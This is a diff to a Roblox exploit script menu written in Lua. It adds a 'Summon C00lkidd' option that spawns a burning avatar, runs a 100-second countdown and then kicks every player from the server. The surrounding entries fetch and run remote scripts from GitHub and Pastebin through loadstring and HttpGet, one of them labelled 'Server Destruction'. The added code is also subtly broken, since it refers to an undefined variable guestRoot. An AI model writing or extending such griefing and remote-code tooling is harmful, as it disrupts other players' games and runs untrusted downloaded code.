@@ -185,8 +185,67 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/deprivationist/Sypher
 		{"Server Destruction (Admin need)", function()
 			loadstring(game:HttpGet('https://raw.githubusercontent.com/SuperHackerYT/AdminThingy/refs/heads/main/Protected_3075172660359461.lua.txt'))()
 		end},
-		{"Break Gravity (Visual)", function()
-			workspace.Gravity = 0
+		{"Summon C00lkidd (Visual)", function()
+			
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local userId = 8035096399
+
+local function spawnC00lkidd()
+	local model = Players:CreateHumanoidModelFromUserId(userId)
+	model.Name = "c00lkidd"
+	model.Parent = workspace
+
+	local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+	if root and model.PrimaryPart then
+		model:SetPrimaryPartCFrame(root.CFrame * CFrame.new(math.random(-5, 5), 0, math.random(-5, 5)))
+	end
+
+	local c00lkiddRoot = model:FindFirstChild("HumanoidRootPart")
+	if c00lkiddRoot then
+		local bp = Instance.new("BodyPosition", c00lkiddRoot)
+		bp.Position = guestRoot.Position + Vector3.new(0, 5, 0)
+		bp.MaxForce = Vector3.new(0, 5000, 0)
+		bp.D = 100
+		bp.P = 3000
+
+		local fire = Instance.new("Fire", c00lkiddRoot)
+		fire.Heat = 10
+		fire.Size = 10
+
+		local smoke = Instance.new("Smoke", c00lkiddRoot)
+		smoke.Color = Color3.new(0, 0, 0)
+		smoke.RiseVelocity = 5
+		smoke.Opacity = 0.5
+		smoke.Size = 10
+	end
+
+	local humanoid = model:FindFirstChild("Humanoid")
+	if humanoid then
+		local tPoseAnim = Instance.new("Animation")
+		tPoseAnim.AnimationId = "rbxassetid://235542946"
+		local track = humanoid:LoadAnimation(tPoseAnim)
+		track.Looped = true
+		track:Play()
+	end
+
+	return model
+end
+
+spawnC00lkidd()
+
+local hint = Instance.new("Hint", workspace)
+
+for i = 100, 1, -1 do
+	hint.Text = "Countdown: " .. i
+	wait(1)
+end
+
+hint:Destroy()
+
+for _, player in pairs(Players:GetPlayers()) do
+	player:Kick("Server Shutdown")
+				end
 		end},
 		{"Server Inspector", function()
 			loadstring(game:HttpGet('https://pastebin.com/raw/rGU7d8sW'))()
